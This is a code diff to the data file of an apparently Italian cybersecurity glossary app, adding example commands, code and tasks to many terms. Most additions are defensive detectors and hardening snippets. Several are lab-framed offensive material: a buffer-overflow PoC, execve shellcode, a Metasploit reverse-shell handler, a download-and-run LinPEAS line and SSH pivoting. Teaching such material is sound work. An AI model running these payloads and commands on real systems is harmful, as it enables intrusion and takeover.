+              task: `Esegui un controllo via ADB per verificare se il binario su e' presente sul dispositivo Android, indizio di rooting.`,
             },
             {
               english: 'Sideloading',
@@ -4255,6 +5172,8 @@ export default {
               context: 'threats',
               difficulty: 'beginner',
               note: "Installare un'app scaricata manualmente (es. file APK) invece che dallo store ufficiale.",
+              command: 'adb install -r downloaded-app.apk',
+              task: 'Installa via ADB un APK scaricato manualmente sul dispositivo Android per simulare uno scenario di sideloading.',
             },
             {
               english: 'Man-in-the-Disk',
@@ -4297,6 +5216,8 @@ export default {
                 "Security researchers use reverse engineering to find app bugs. = I ricercatori di sicurezza usano l'ingegneria inversa per trovare bug nelle app.",
               context: 'analysis',
               difficulty: 'advanced',
+              command: 'apktool d target-app.apk -o reversed/ && jadx -d sources/ target-app.apk',
+              task: `Decompila l'APK target-app.apk con apktool e jadx per analizzare il codice smali e Java durante il reverse engineering.`,
             },
           ],
         },
@@ -4315,6 +5236,8 @@ export default {
               context: 'management-tools',
               difficulty: 'intermediate',
               note: "Software che permette all'IT di gestire e proteggere smartphone e tablet aziendali.",
+              command: `curl -X POST 'https://api.intune.microsoft.com/v1.0/deviceManagement/managedDevices' -H 'Authorization: Bearer $TOKEN' -d @device-config.json`,
+              task: `Pubblica una nuova configurazione di sicurezza per i dispositivi gestiti tramite l'API Intune dell'MDM aziendale.`,
             },
             {
               english: 'BYOD (Bring Your Own Device)',
@@ -4347,6 +5270,8 @@ export default {
               context: 'incident-response',
               difficulty: 'beginner',
               note: 'Comando inviato via internet per cancellare tutti i dati sul dispositivo.',
+              command: `curl -X POST 'https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/{id}/wipe' -H 'Authorization: Bearer $TOKEN' -d '{"keepEnrollmentData":false,"keepUserData":false}'`,
+              task: `Invia un comando di cancellazione remota completa al dispositivo smarrito tramite l'API Microsoft Graph dell'MDM.`,
             },
             {
               english: 'Geofencing',
@@ -4357,6 +5282,17 @@ export default {
                 "The MDM policy uses geofencing to lock corporate apps when the phone leaves the office perimeter. = La policy MDM usa il geofencing per bloccare le app aziendali quando il telefono lascia il perimetro dell'ufficio.",
               context: 'defense',
               difficulty: 'intermediate',
+              code: `import CoreLocation
+
+let office = CLCircularRegion(
+    center: CLLocationCoordinate2D(latitude: 45.4642, longitude: 9.1900),
+    radius: 200,
+    identifier: "office-perimeter"
+)
+office.notifyOnEntry = true
+office.notifyOnExit = true
+locationManager.startMonitoring(for: office)`,
+              task: `Definisci una regione circolare di geofencing attorno alla sede aziendale che notifichi l'app quando l'utente entra o esce.`,
             },
             {
               english: 'Device Attestation',
@@ -4366,6 +5302,14 @@ export default {
               example: `Server-side device attestation rejects logins from rooted phones before the credentials are ever submitted. = L'attestazione del dispositivo lato server rifiuta i login da telefoni rooted prima ancora che le credenziali siano sottomesse.`,
               context: 'defense',
               difficulty: 'advanced',
+              code: `// Android Play Integrity API client-side request
+val integrityManager = IntegrityManagerFactory.create(context)
+val tokenRequest = IntegrityTokenRequest.builder()
+    .setNonce(serverNonce)
+    .build()
+integrityManager.requestIntegrityToken(tokenRequest)
+    .addOnSuccessListener { response -> sendToServer(response.token()) }`,
+              task: `Richiedi un token Play Integrity sul client Android e invialo al server per verificare l'attestazione del dispositivo prima del login.`,
             },
             {
               english: 'UEM (Unified Endpoint Management)',
@@ -4386,6 +5330,8 @@ export default {
                 'Containerization separates work data from personal data. = La containerizzazione separa i dati di lavoro da quelli personali.',
               context: 'defense',
               difficulty: 'intermediate',
+              command: `adb shell pm create-user --profileOf 0 --managed 'Work Profile'`,
+              task: 'Crea un work profile gestito su Android per isolare le app aziendali dai dati personali tramite containerizzazione.',
             },
             {
               english: 'Enrollment',
@@ -4396,6 +5342,9 @@ export default {
                 "Device enrollment is the first step in MDM setup. = L'enrollment \u00E8 il primo passo nella configurazione MDM.",
               context: 'management-process',
               difficulty: 'intermediate',
+              command:
+                'profiles install -type configuration -path /tmp/mdm-enrollment.mobileconfig',
+              task: 'Installa il profilo di configurazione MDM su un dispositivo iOS aziendale per completare la fase di enrollment.',
             },
             {
               english: 'Policy Enforcement',
@@ -4406,6 +5355,16 @@ export default {
                 "Automated policy enforcement through MDM ensures that every device meets security requirements. = L'applicazione automatica delle policy tramite MDM garantisce che ogni dispositivo rispetti i requisiti di sicurezza.",
               context: 'management-process',
               difficulty: 'intermediate',
+              code: `{
+  "policyName": "corporate-baseline",
+  "passwordRequirements": {
+    "passwordMinimumLength": 8,
+    "passwordQuality": "COMPLEX"
+  },
+  "encryptionPolicy": "ENABLED_WITHOUT_PASSWORD",
+  "cameraDisabled": true
+}`,
+              task: 'Definisci una policy Android Enterprise che impone password complesse, cifratura del device e fotocamera disabilitata sui dispositivi gestiti.',
             },
           ],
         },
@@ -4423,6 +5382,14 @@ export default {
               context: 'defense',
               difficulty: 'advanced',
               note: `Termine inglese usato in italiano: indica l'aggancio dell'app a un certificato o chiave pubblica attesa.`,
+              code: `// Android OkHttp certificate pinning
+val pinner = CertificatePinner.Builder()
+    .add("api.bank.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
+    .build()
+val client = OkHttpClient.Builder()
+    .certificatePinner(pinner)
+    .build()`,
+              task: `Configura il certificate pinning con OkHttp sull'app Android per agganciare le chiamate verso api.bank.com a una sola chiave pubblica attesa.`,
             },
             {
               english: 'Code Obfuscation',
@@ -4433,6 +5400,9 @@ export default {
                 "Obfuscation makes it harder for hackers to understand the app logic. = L'offuscamento rende pi\u00F9 difficile per gli hacker capire la logica dell'app.",
               context: 'defense',
               difficulty: 'advanced',
+              command:
+                'java -jar proguard.jar @proguard-rules.pro -injars app.jar -outjars app-obfuscated.jar',
+              task: `Esegui ProGuard sul JAR dell'app Android per rinominare classi e metodi e rendere piu' difficile l'analisi del codice compilato.`,
             },
             {
               english: 'Root Detection',
@@ -4444,6 +5414,15 @@ export default {
               context: 'defense',
               difficulty: 'intermediate',
               note: "L'app smette di funzionare se rileva che il dispositivo \u00E8 stato manomesso.",
+              code: `fun isDeviceRooted(): Boolean {
+    val suPaths = arrayOf(
+        "/system/bin/su", "/system/xbin/su",
+        "/sbin/su", "/system/app/Superuser.apk"
+    )
+    return suPaths.any { File(it).exists() } ||
+           Build.TAGS?.contains("test-keys") == true
+}`,
+              task: 'Implementa un controllo di root detection in Kotlin che verifica la presenza del binario su e dei tag di build di test sui dispositivi Android.',
             },
             {
               english: 'Secure Enclave (iOS)',
@@ -4476,6 +5455,12 @@ export default {
               context: 'threats',
               difficulty: 'advanced',
               note: "Versione mobile del clickjacking: un'app invisibile si sovrappone a quella reale.",
+              code: `<!-- AndroidManifest / layout protection against tapjacking -->
+<Button
+    android:id="@+id/confirm_payment"
+    android:text="Confirm"
+    android:filterTouchesWhenObscured="true" />`,
+              task: `Imposta l'attributo filterTouchesWhenObscured sul bottone di conferma pagamento per bloccare i tap quando un overlay nasconde la view.`,
             },
             {
               english: 'Intent Injection',
@@ -4485,6 +5470,15 @@ export default {
               example: `An Android intent injection bug lets a malicious app trigger restricted activities that the target app never exposed publicly. = Un bug di iniezione di intent su Android permette a un'app malevola di triggerare activity ristrette che l'app target non ha mai esposto pubblicamente.`,
               context: 'web-vulnerabilities',
               difficulty: 'expert',
+              code: `// Vulnerable receiver (DO NOT do this)
+<receiver android:name=".AdminReceiver" android:exported="true" />
+
+// Hardened: mark non-exported and require permission
+<receiver
+    android:name=".AdminReceiver"
+    android:exported="false"
+    android:permission="com.app.PRIVATE" />`,
+              task: `Marca i receiver sensibili come non esportati e protetti da un permesso custom per prevenire l'iniezione di intent da app malevole.`,
             },
             {
               english: 'Data Leakage (App)',
@@ -4496,6 +5490,8 @@ export default {
               context: 'threats',
               difficulty: 'intermediate',
               note: 'Dati sensibili salvati in log o cache accessibili ad altre app.',
+              command: 'adb shell run-as com.target.app ls -la /data/data/com.target.app/cache',
+              task: `Ispeziona la cache interna dell'app target via ADB per verificare se sta salvando dati sensibili che potrebbero essere esfiltrati.`,
             },
             {
               english: 'App Wrapping',
@@ -4506,6 +5502,9 @@ export default {
               context: 'defense',
               difficulty: 'advanced',
               note: `Termine inglese usato in italiano: indica l'aggiunta di un involucro di policy attorno a un'app esistente.`,
+              command:
+                'intune-app-wrapping-tool-android -i original.apk -o wrapped.apk -k release.keystore',
+              task: `Avvolgi l'APK originale con il tool di Intune per applicare le policy MDM aziendali su un'app di terze parti non modificata.`,
             },
             {
               english: 'Biometric Unlock',
@@ -4516,6 +5515,13 @@ export default {
                 'Enable biometric unlock for your banking app. = Abilita lo sblocco biometrico per la tua app bancaria.',
               context: 'authentication',
               difficulty: 'beginner',
+              code: `val promptInfo = BiometricPrompt.PromptInfo.Builder()
+    .setTitle("Authenticate to open the vault")
+    .setNegativeButtonText("Use password")
+    .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
+    .build()
+biometricPrompt.authenticate(promptInfo)`,
+              task: `Configura BiometricPrompt sull'app Android per richiedere l'impronta digitale all'apertura del vault delle credenziali.`,
             },
           ],
         },
@@ -4533,6 +5539,9 @@ export default {
                 'A mobile VPN protects your traffic on public Wi-Fi. = Una VPN mobile protegge il tuo traffico su Wi-Fi pubbliche.',
               context: 'defense',
               difficulty: 'beginner',
+              command:
+                'sudo wg-quick up corp-vpn && curl --interface wg0 https://api.internal.corp/health',
+              task: 'Attiva la VPN aziendale WireGuard sul dispositivo mobile e verifica che il traffico verso le API interne passi attraverso il tunnel.',
             },
             {
               english: 'Rogue Wi-Fi (Mobile)',
@@ -4585,6 +5594,9 @@ export default {
                 'Many IoT devices use BLE with weak security. = Molti dispositivi IoT usano il BLE con sicurezza debole.',
               context: 'networking',
               difficulty: 'intermediate',
+              command:
+                'sudo hcitool lescan --duplicates && sudo bluetoothctl pair AA:BB:CC:DD:EE:FF',
+              task: `Scansiona i dispositivi BLE in broadcast nelle vicinanze e prova un pairing autenticato per verificare la sicurezza dell'accoppiamento.`,
             },
             {
               english: 'NFC Security',
@@ -4596,6 +5608,13 @@ export default {
               context: 'networking',
               difficulty: 'intermediate',
               note: 'Near Field Communication.',
+              code: `<!-- Limit which app handles NFC intents -->
+<intent-filter>
+    <action android:name="android.nfc.action.NDEF_DISCOVERED" />
+    <data android:mimeType="application/vnd.bank.payment" />
+    <category android:name="android.intent.category.DEFAULT" />
+</intent-filter>`,
+              task: `Limita l'intent filter NFC dell'app di pagamento a un mime-type proprietario per evitare che app malevole intercettino le transazioni.`,
             },
             {
               english: 'Wi-Fi Direct Security',
@@ -4606,6 +5625,9 @@ export default {
                 'Wi-Fi Direct allows devices to connect without an access point. = Il Wi-Fi Direct permette ai dispositivi di connettersi senza un access point.',
               context: 'networking',
               difficulty: 'intermediate',
+              command:
+                'adb shell cmd wifip2p list-peers && adb shell settings put global wifi_p2p_pending_factory_reset 1',
+              task: 'Elenca i peer Wi-Fi Direct visibili dal dispositivo Android e resetta lo stato P2P per ripulire connessioni precedenti non fidate.',
             },
             {
               english: 'Roaming Security',
@@ -4626,6 +5648,9 @@ export default {
                 'Use a strong password for your personal hotspot to avoid tethering risks. = Usa una password forte per il tuo hotspot personale per evitare i rischi del tethering.',
               context: 'threats',
               difficulty: 'beginner',
+              command:
+                'adb shell svc wifi disable && adb shell cmd wifi set-wifi-enabled enabled && adb shell settings put global tether_dun_required 0',
+              task: 'Disabilita il tethering Wi-Fi sul dispositivo Android per ridurre il rischio che terzi si colleghino al tuo hotspot personale.',
             },
           ],
         },
@@ -4703,6 +5728,8 @@ export default {
               example: `A full adversary simulation chains spear-phishing, lateral movement and data theft to test detection end-to-end. = Una simulazione dell'avversario completa concatena spear-phishing, movimento laterale e furto dati per testare la detection end-to-end.`,
               context: 'offensive-security',
               difficulty: 'advanced',
+              command: 'atomic-red-team invoke-atomictest T1059.003 -PathToAtomicsFolder ./atomics',
+              task: `Esegui un test atomico di Atomic Red Team per la tecnica T1059.003 in un cyber range isolato e verifica che il SIEM generi l'alert atteso.`,
             },
             {
               english: 'Threat Hunting',
@@ -4713,6 +5740,18 @@ export default {
               context: 'defensive-security',
               difficulty: 'advanced',
               note: 'Termine inglese usato in italiano: indica la caccia proattiva a minacce non ancora segnalate dai tool automatici.',
+              code: `# Hunt for suspicious PowerShell encoded command execution
+import pandas as pd
+from siem_client import query
+
+hunt = query(
+    "index=edr EventCode=4688 process_name=powershell.exe"
+    " | search command_line=\\"*-enc*\\" OR command_line=\\"*FromBase64*\\""
+    " | stats count by host user command_line"
+)
+suspicious = hunt[hunt['count'] < 5]
+suspicious.to_csv('hunt_findings.csv', index=False)`,
+              task: `Implementa una query di threat hunting che parta dall'ipotesi di esecuzione di PowerShell offuscato e restituisca host, utente e comando da revisionare con il SOC.`,
             },
             {
               english: 'SOAR (Security Orchestration, Automation, and Response)',
@@ -4762,6 +5801,8 @@ export default {
                 'A solid malware analysis report covers behavior, persistence mechanisms and indicators useful to the SOC. = Un solido report di analisi del malware copre comportamento, meccanismi di persistenza e indicatori utili al SOC.',
               context: 'analysis',
               difficulty: 'intermediate',
+              command: 'clamscan --recursive --infected --detect-pua=yes /samples/quarantine/',
+              task: `Analizza in modalita' batch una directory di sample in quarantena con ClamAV evidenziando solo i file infetti e i programmi potenzialmente indesiderati.`,
             },
             {
               english: 'Static Analysis',
@@ -4771,6 +5812,8 @@ export default {
               example: `Begin with static analysis of the binary so you map imports, strings and packers before running it in a sandbox. = Comincia con l'analisi statica del binario così mappi import, stringhe e packer prima di eseguirlo in una sandbox.`,
               context: 'analysis',
               difficulty: 'intermediate',
+              command: `strings -a -n 8 sample.bin | grep -Ei 'http://|\\.exe|cmd\\.exe|powershell' && objdump -d sample.bin | head -200`,
+              task: `Estrai le stringhe rilevanti e disassembla l'inizio del binario per mappare URL, import sospetti e flusso di esecuzione prima di detonarlo in sandbox.`,
             },
             {
               english: 'Dynamic Analysis',
@@ -4781,6 +5824,8 @@ export default {
                 'Detonate the sample in an isolated VM and watch the dynamic analysis traces for network beacons and registry writes. = Detona il sample in una VM isolata e osserva le tracce di analisi dinamica per beacon di rete e scritture al registro.',
               context: 'analysis',
               difficulty: 'intermediate',
+              command: 'strace -f -e trace=network,file,process -o sample.trace ./sample.bin',
+              task: 'Esegui il sample in una VM di laboratorio tracciando le syscall di rete, file e processo per documentare il comportamento dinamico del malware.',
             },
             {
               english: 'Reverse Engineering',
@@ -4791,6 +5836,8 @@ export default {
               example: `Ghidra and IDA Pro are the de facto tools for reverse engineering of stripped binaries during incident response. = Ghidra e IDA Pro sono gli strumenti de facto per l'ingegneria inversa di binari stripped durante l'incident response.`,
               context: 'analysis',
               difficulty: 'advanced',
+              command: `r2 -A -q -c 'aaa; pdf @ main; iz' suspicious.bin`,
+              task: `Apri il binario in radare2, esegui l'analisi completa e stampa il disassemblato della funzione main per avviare il reverse engineering del campione.`,
             },
             {
               english: 'Disassembler',
@@ -4802,6 +5849,8 @@ export default {
               context: 'analysis-tools',
               difficulty: 'expert',
               note: 'Traduce il linguaggio macchina (binario) in codice assembly leggibile.',
+              command: 'objdump -d -M intel sample.exe | less',
+              task: `Usa objdump come disassemblatore per ottenere l'assembly Intel del binario e individuare le routine chiave da approfondire in IDA o Ghidra.`,
             },
             {
               english: 'Debugger',
@@ -4812,6 +5861,8 @@ export default {
                 "A debugger allows pausing the malware execution. = Un debugger permette di mettere in pausa l'esecuzione del malware.",
               context: 'analysis-tools',
               difficulty: 'advanced',
+              command: 'gdb -q --args ./sample.bin && (gdb) break main && (gdb) run',
+              task: `Carica il sample in gdb in un ambiente isolato, imposta un breakpoint su main e avvia l'esecuzione controllata per analizzare lo stato di memoria.`,
             },
             {
               english: 'Packer',
@@ -4822,6 +5873,8 @@ export default {
                 'A packer compresses or encrypts the malware to hide it from antivirus. = Un packer comprime o cifra il malware per nasconderlo agli antivirus.',
               context: 'threats',
               difficulty: 'advanced',
+              command: 'upx -t suspicious.exe && die suspicious.exe',
+              task: `Verifica se il binario e' impacchettato con UPX e identifica il packer impiegato tramite Detect It Easy prima di tentare l'unpacking in sandbox.`,
             },
             {
               english: 'Obfuscation',
@@ -4832,6 +5885,23 @@ export default {
                 "Malware authors rely on obfuscation to hide malicious logic from antivirus scanners. = Gli autori di malware si affidano all'offuscamento per nascondere la logica malevola dagli scanner antivirus.",
               context: 'threats',
               difficulty: 'advanced',
+              code: `# Defensive: detect base64-obfuscated PowerShell in command-line telemetry
+import re
+
+B64_PATTERN = re.compile(r'(?:-enc(?:odedcommand)?|FromBase64String)\\s*[\\"\\']?([A-Za-z0-9+/=]{40,})', re.IGNORECASE)
+
+def flag_obfuscated(cmd: str) -> bool:
+    match = B64_PATTERN.search(cmd)
+    if not match:
+        return False
+    blob = match.group(1)
+    entropy = len(set(blob)) / len(blob)
+    return entropy > 0.45
+
+for event in load_edr_events('today'):
+    if flag_obfuscated(event.command_line):
+        siem.alert('Possibile offuscamento PowerShell', event)`,
+              task: `Costruisci un detector che riconosca comandi PowerShell offuscati in base64, calcoli l'entropia del payload e inoltri un alert al SIEM.`,
             },
             {
               english: 'Behavioral Signature',
@@ -4843,6 +5913,21 @@ export default {
                 'Antivirus can use behavioral signatures to detect unknown threats. = Gli antivirus possono usare firme comportamentali per rilevare minacce sconosciute.',
               context: 'defensive-security',
               difficulty: 'intermediate',
+              code: `// YARA behavioral signature: process hollowing via WriteProcessMemory + SetThreadContext
+rule Behavior_Process_Hollowing {
+    meta:
+        author = "blue-team"
+        description = "Rileva la firma comportamentale del process hollowing"
+    strings:
+        $a = "CreateProcessA" ascii wide
+        $b = "NtUnmapViewOfSection" ascii wide
+        $c = "WriteProcessMemory" ascii wide
+        $d = "SetThreadContext" ascii wide
+        $e = "ResumeThread" ascii wide
+    condition:
+        all of them
+}`,
+              task: 'Scrivi una firma comportamentale YARA che identifichi la combinazione di API tipica del process hollowing per usarla nella scansione delle workstation.',
             },
             {
               english: 'Sandbox Escape',
@@ -4854,6 +5939,19 @@ export default {
               context: 'threats',
               difficulty: 'expert',
               note: "Tecnica per uscire dall'ambiente isolato e infettare il sistema ospite.",
+              code: `# Defensive: detect sandbox-aware checks performed by the sample
+SANDBOX_INDICATORS = [
+    'IsDebuggerPresent', 'CheckRemoteDebuggerPresent',
+    'GetTickCount', 'NtQuerySystemInformation',
+    'vmware', 'virtualbox', 'sandbox', 'cuckoo'
+]
+
+def detect_sandbox_evasion(api_calls, strings):
+    hits = [ind for ind in SANDBOX_INDICATORS
+            if any(ind.lower() in s.lower() for s in strings + api_calls)]
+    if hits:
+        report('Sample esegue check anti-sandbox', indicators=hits)`,
+              task: 'Implementa un controllo che analizzi API e stringhe del campione e segnali eventuali tentativi di evasione dalla sandbox prima di considerare benigno il file.',
             },
           ],
         },
@@ -4902,6 +6000,8 @@ export default {
               context: 'attack-techniques',
               difficulty: 'intermediate',
               note: "Spostarsi da un computer all'altro all'interno della stessa rete.",
+              command: `bloodhound-python -u analyst -p 'Lab!Pass' -d corp.local -ns 10.0.0.10 -c All`,
+              task: `Raccogli i dati di Active Directory con BloodHound in laboratorio per mappare i possibili percorsi di movimento laterale e identificare i path piu' rischiosi da bonificare.`,
             },
             {
               english: 'Persistence',
@@ -4913,6 +6013,9 @@ export default {
               context: 'attack-techniques',
               difficulty: 'intermediate',
               note: "Capacit\u00E0 dell'attaccante di rimanere nel sistema anche dopo un riavvio.",
+              command:
+                'sudo auditctl -w /etc/systemd/system -p wa -k persistence_watch && sudo systemctl list-unit-files --state=enabled',
+              task: 'Configura auditd per monitorare scritture nelle unit systemd ed elenca i servizi abilitati alla ricerca di meccanismi di persistenza non autorizzati.',
             },
             {
               english: 'Command and Control (C2)',
@@ -4924,6 +6027,28 @@ export default {
               context: 'threat-infrastructure',
               difficulty: 'intermediate',
               note: 'Il server centrale da cui gli hacker inviano comandi ai sistemi infetti.',
+              code: `# Defensive: detect periodic beaconing toward suspected C2 infrastructure
+import scapy.all as scapy
+from collections import defaultdict
+import statistics
+
+known_c2 = load_threat_intel('c2-feed.json')
+intervals = defaultdict(list)
+last_seen = {}
+
+for pkt in scapy.sniff(filter='tcp port 443 or udp port 53', count=5000):
+    if scapy.IP not in pkt:
+        continue
+    dst = pkt[scapy.IP].dst
+    if dst in known_c2:
+        if dst in last_seen:
+            intervals[dst].append(pkt.time - last_seen[dst])
+        last_seen[dst] = pkt.time
+
+for dst, deltas in intervals.items():
+    if len(deltas) > 5 and statistics.stdev(deltas) < 2:
+        siem.alert(f'Possibile callback C2 verso {dst}', deltas=deltas)`,
+              task: 'Implementa un rilevatore di callback C2 che intercetti il traffico, lo confronti con un feed di threat intelligence e segnali pattern di beaconing regolare verso domini noti.',
             },
             {
               english: 'Data Exfiltration',
@@ -4934,6 +6059,8 @@ export default {
               example: `Slow, chunked data exfiltration over DNS often evades volume-based DLP rules tuned for HTTP uploads. = L'esfiltrazione dei dati lenta e a chunk via DNS spesso elude le regole DLP basate sul volume calibrate per gli upload HTTP.`,
               context: 'threats',
               difficulty: 'beginner',
+              command: `sudo tcpdump -i eth0 -nn 'udp port 53' -w dns.pcap and tshark -r dns.pcap -Y 'dns.qry.name.len > 50' -T fields -e dns.qry.name`,
+              task: 'Cattura il traffico DNS sul gateway ed estrai le query con nomi anomalmente lunghi per identificare possibili tentativi di esfiltrazione dati via DNS tunneling.',
             },
             {
               english: 'Living off the Land (LotL)',
@@ -4945,6 +6072,8 @@ export default {
               context: 'attack-techniques',
               difficulty: 'advanced',
               note: 'Rende molto difficile il rilevamento perch\u00E9 non viene installato software "strano".',
+              command: `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} | Where-Object {$_.Message -match 'IEX|Invoke-WebRequest|DownloadString'}`,
+              task: 'Interroga il log operational di PowerShell sui endpoint per individuare uso di binari legittimi tipico delle tecniche LotL e prioritizzare le indagini del SOC.',
             },
             {
               english: 'Beaconing',
@@ -4956,6 +6085,20 @@ export default {
               context: 'threat-infrastructure',
               difficulty: 'advanced',
               note: 'Segnali periodici inviati dal malware al server C2 per dire "sono ancora qui".',
+              code: `# Defensive: identify beaconing by clustering inter-arrival times per destination
+import pandas as pd
+
+flows = pd.read_parquet('netflow.parquet')
+flows['delta'] = flows.groupby('dst_ip')['timestamp'].diff().dt.total_seconds()
+
+beacons = (
+    flows.dropna(subset=['delta'])
+    .groupby('dst_ip')['delta']
+    .agg(['count', 'mean', 'std'])
+    .query('count >= 10 and std < 3 and mean.between(30, 3600)')
+)
+beacons.to_csv('beaconing_candidates.csv')`,
+              task: 'Analizza i netflow e individua i candidati a beaconing calcolando la deviazione standard degli intervalli verso ogni destinazione e isolando i pattern regolari.',
             },
             {
               english: 'Spear Phishing',
@@ -5013,6 +6156,22 @@ export default {
                 'Modern exploit development must defeat ASLR, DEP and CFG before the payload ever gets a chance to run. = Lo sviluppo di exploit moderno deve sconfiggere ASLR, DEP e CFG prima che il payload abbia la possibilità di eseguire.',
               context: 'research',
               difficulty: 'expert',
+              code: `# Educational lab: classic stack buffer overflow PoC for a vulnerable training binary
+# Run ONLY against the dedicated CTF target in an isolated VM.
+import struct
+import socket
+
+TARGET = ('10.0.0.50', 9999)  # lab-only address
+OFFSET = 146                  # found via pattern_create / pattern_offset
+JMP_ESP = 0x625011AF          # non-ASLR module in the lab binary
+NOPS = b'\\x90' * 16
+SHELLCODE = b'\\xcc' * 32      # INT3 placeholder — replace with debug payload only
+
+payload = b'A' * OFFSET + struct.pack('<I', JMP_ESP) + NOPS + SHELLCODE
+
+with socket.create_connection(TARGET, timeout=5) as s:
+    s.sendall(b'TRUN /.:/' + payload + b'\\r\\n')`,
+              task: `Costruisci un PoC didattico di stack buffer overflow contro il binario vulnerabile del laboratorio CTF, calcolando l'offset corretto e impostando un payload INT3 per studiare l'exploit development sotto debugger.`,
             },
             {
               english: 'Zero-day Research',
@@ -5034,6 +6193,8 @@ export default {
                 'AFL is a popular tool for automated fuzzing. = AFL \u00E8 uno strumento popolare per il fuzzing automatizzato.',
               context: 'offensive-security',
               difficulty: 'advanced',
+              command: 'afl-fuzz -i corpus_in/ -o findings/ -M master -- ./target_binary @@',
+              task: 'Avvia una sessione di fuzzing avanzato con AFL++ usando un corpus iniziale di input validi e raccogli i crash riproducibili nella directory findings per il triage.',
             },
             {
               english: 'Post-Exploitation',
@@ -5044,6 +6205,9 @@ export default {
               context: 'offensive-security',
               difficulty: 'advanced',
               note: `Termine inglese usato in italiano: indica le attività svolte dopo aver ottenuto l'accesso iniziale alla macchina.`,
+              command:
+                'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; run"',
+              task: 'Avvia un handler Metasploit in laboratorio per ricevere la sessione Meterpreter del target di training e documentare le tecniche di post-exploitation osservate.',
             },
             {
               english: 'Shellcode',
@@ -5055,6 +6219,21 @@ export default {
               context: 'offensive-security',
               difficulty: 'expert',
               note: 'Piccola parte di codice usata come payload per ottenere una shell di comando.',
+              code: `# Lab-only: minimal Linux x86_64 execve("/bin/sh") shellcode for analysis
+# Used to study how EDR rules trigger on shellcode patterns in memory.
+shellcode = bytes([
+    0x48, 0x31, 0xd2,                         # xor rdx, rdx
+    0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69,       # mov rbx, '//bin/sh'
+    0x6e, 0x2f, 0x73, 0x68,
+    0x48, 0xc1, 0xeb, 0x08,                   # shr rbx, 8
+    0x53,                                     # push rbx
+    0x48, 0x89, 0xe7,                         # mov rdi, rsp
+    0x48, 0x31, 0xc0,                         # xor rax, rax
+    0xb0, 0x3b,                               # mov al, 0x3b (execve)
+    0x0f, 0x05                                # syscall
+])
+open('shellcode.bin', 'wb').write(shellcode)`,
+              task: 'Genera un blob di shellcode educativo execve(/bin/sh) e salvalo su file in un ambiente di laboratorio per studiare le firme di detection usate dagli EDR.',
             },
             {
               english: 'Privilege Escalation (Exploit)',
@@ -5066,6 +6245,9 @@ export default {
                 'Use a kernel exploit for privilege escalation. = Usa un exploit del kernel per la scalata dei privilegi.',
               context: 'offensive-security',
               difficulty: 'intermediate',
+              command:
+                'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh && bash /tmp/linpeas.sh -a > linpeas_report.txt',
+              task: 'Esegui LinPEAS sulla macchina di laboratorio per enumerare automaticamente i vettori di privilege escalation noti e produrre un report da revisionare con il team difensivo.',
             },
             {
               english: 'Pivoting',
@@ -5076,6 +6258,9 @@ export default {
                 "After gaining a foothold, the attacker used pivoting to reach the database server on a separate subnet. = Dopo aver ottenuto un punto d'appoggio, l'attaccante ha usato il pivoting per raggiungere il server database su una sottorete separata.",
               context: 'offensive-security',
               difficulty: 'advanced',
+              command:
+                'ssh -D 1080 -N -f operator@jump.lab.local && proxychains4 nmap -sT -Pn 10.10.20.0/24',
+              task: `Apri un tunnel SOCKS via SSH verso l'host pivot del laboratorio e usa proxychains per scansionare la sottorete interna mantenendo il traffico instradato attraverso il pivot.`,
             },
           ],
         },
@@ -5230,6 +6415,24 @@ export default {
                 'Protect PII such as names and social security numbers. = Proteggi le PII come nomi e codici fiscali.',
               context: 'data-privacy',
               difficulty: 'beginner',
+              code: `# Defensive: scan a directory tree for likely PII (Italian fiscal code + emails)
+import re
+import pathlib
+
+FISCAL = re.compile(r'\\b[A-Z]{6}\\d{2}[A-EHLMPR-T]\\d{2}[A-Z]\\d{3}[A-Z]\\b')
+EMAIL = re.compile(r'\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}\\b')
+
+findings = []
+for path in pathlib.Path('/data/exports').rglob('*.csv'):
+    text = path.read_text(errors='ignore')
+    fiscal_hits = FISCAL.findall(text)
+    email_hits = EMAIL.findall(text)
+    if fiscal_hits or email_hits:
+        findings.append({'file': str(path), 'fiscal': len(fiscal_hits), 'email': len(email_hits)})
+
+for row in findings:
+    print(row)`,
+              task: 'Implementa uno scanner che esamini gli export CSV alla ricerca di PII come codici fiscali ed email, producendo un report da inoltrare al DPO per la valutazione GDPR.',
             },
             {
               english: 'PHI (Protected Health Information)',
@@ -5240,6 +6443,23 @@ export default {
                 'PHI must be handled according to HIPAA standards. = Le PHI devono essere gestite secondo gli standard HIPAA.',
               context: 'data-privacy',
               difficulty: 'intermediate',
+              code: `# Defensive: redact PHI fields in a HL7-like record before sharing with analytics
+import hashlib
+
+PHI_FIELDS = {'patient_id', 'ssn', 'name', 'dob', 'address', 'phone', 'mrn'}
+
+def pseudonymize(record: dict, salt: str) -> dict:
+    safe = {}
+    for key, value in record.items():
+        if key in PHI_FIELDS and value:
+            safe[key] = hashlib.sha256((salt + str(value)).encode()).hexdigest()[:16]
+        else:
+            safe[key] = value
+    return safe
+
+for record in load_emr_export():
+    write_to_warehouse(pseudonymize(record, salt=SECRETS['phi_salt']))`,
+              task: `Costruisci una pipeline che pseudonimizzi i campi PHI in uscita dall'EMR usando un hash salato, in modo da poter condividere i dati con l'analytics nel rispetto di HIPAA.`,
             },
             {
               english: 'Data Controller',
@@ -5389,6 +6609,23 @@ export default {
               example: `Boards prefer quantitative risk analysis because dollar figures and probabilities translate directly into investment trade-offs. = I board preferiscono l'analisi quantitativa del rischio perché cifre in dollari e probabilità si traducono direttamente in trade-off di investimento.`,
               context: 'risk-management',
               difficulty: 'advanced',
+              code: `# Annualized Loss Expectancy (ALE) for quantitative risk analysis
+# ALE = SLE * ARO where SLE = AV * EF
+
+def ale(asset_value: float, exposure_factor: float, annual_rate: float) -> float:
+    sle = asset_value * exposure_factor
+    return sle * annual_rate
+
+scenarios = [
+    {'name': 'Ransomware su file server', 'av': 500_000, 'ef': 0.6, 'aro': 0.25},
+    {'name': 'Data breach CRM',          'av': 1_200_000, 'ef': 0.3, 'aro': 0.1},
